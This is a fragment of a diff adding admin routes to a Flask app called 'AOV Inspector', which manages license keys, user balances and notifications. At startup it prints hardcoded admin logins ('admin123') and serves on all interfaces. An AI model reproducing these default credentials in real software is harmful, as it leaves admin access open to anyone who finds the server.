+    if key in GENERATED_KEYS: key = f"{name}_{int(time.time())}"
+    GENERATED_KEYS[key] = {"name": name, "remaining_uses": us, "check_count": cc,
+                            "created_by": session["username"],
+                            "expires": time.time() + 86400 * 7 if kt == "day" else float('inf'),
+                            "type": kt, "created_at": time.time()}
+    save_data()
+    flash(f"Đã tạo key: {key}", "success")
+    return redirect(url_for("admin_panel", tab="keys"))
+
+@app.route("/admin/delete_key", methods=["POST"])
+@admin_required
+def admin_delete_key():
+    k = request.form.get("key", "")
+    if k in GENERATED_KEYS:
+        del GENERATED_KEYS[k]
+        save_data()
+        flash(f"Đã xóa key {k}", "success")
+    return redirect(url_for("admin_panel", tab="keys"))
+
+@app.route("/admin/add_balance", methods=["POST"])
+@admin_required
+def admin_add_balance():
+    un = request.form.get("username", "")
+    try: amt = int(request.form.get("amount", 0))
+    except ValueError:
+        flash("Số không hợp lệ!", "error")
+        return redirect(url_for("admin_panel", tab="users"))
+    if un in USERS:
+        USERS[un]["balance"] = USERS[un].get("balance", 0) + amt
+        save_data()
+        flash(f"Đã cộng {amt} cho {un}", "success")
+    return redirect(url_for("admin_panel", tab="users"))
+
+@app.route("/admin/add_all", methods=["POST"])
+@admin_required
+def admin_add_all():
+    try: amt = int(request.form.get("amount", 0))
+    except ValueError:
+        flash("Số không hợp lệ!", "error")
+        return redirect(url_for("admin_panel"))
+    for u in USERS.values(): u["balance"] = u.get("balance", 0) + amt
+    save_data()
+    flash(f"Đã cộng {amt} cho {len(USERS)} users", "success")
+    return redirect(url_for("admin_panel"))
+
+@app.route("/admin/send_notification", methods=["POST"])
+@admin_required
+def admin_send_notification():
+    t = request.form.get("title", "").strip()
+    c = request.form.get("content", "").strip()
+    if not t or not c:
+        flash("Nhập đầy đủ tiêu đề và nội dung!", "error")
+        return redirect(url_for("admin_panel", tab="notif"))
+    notif = {"id": uuid.uuid4().hex[:10], "title": t, "content": c,
+             "admin": session["username"],
+             "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+             "timestamp": time.time()}
+    NOTIFICATIONS.append(notif)
+    if len(NOTIFICATIONS) > 200: NOTIFICATIONS.pop(0)
+    save_data()
+    flash(f"Đã gửi thông báo: {t}", "success")
+    return redirect(url_for("admin_panel", tab="notif"))
+
+@app.route("/admin/delete_notification", methods=["POST"])
+@admin_required
+def admin_delete_notification():
+    global NOTIFICATIONS
+    nid = request.form.get("notif_id", "")
+    NOTIFICATIONS = [n for n in NOTIFICATIONS if n.get("id") != nid]
+    save_data()
+    flash("Đã xóa thông báo", "success")
+    return redirect(url_for("admin_panel", tab="notif"))
+
+# ============================ RUN ============================
+if __name__ == "__main__":
+    load_data()
+    create_admin_accounts()
+    print("=" * 60)
+    print("◈ AOV INSPECTOR - NEON MATRIX EDITION")
+    print("=" * 60)
+    print("👑 Admin:")
+    print("   • admin  / admin123")
+    print("   • admin2 / admin123")
+    print("=" * 60)
+    print("🌐 http://localhost:5000")
+    print("=" * 60)
+    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
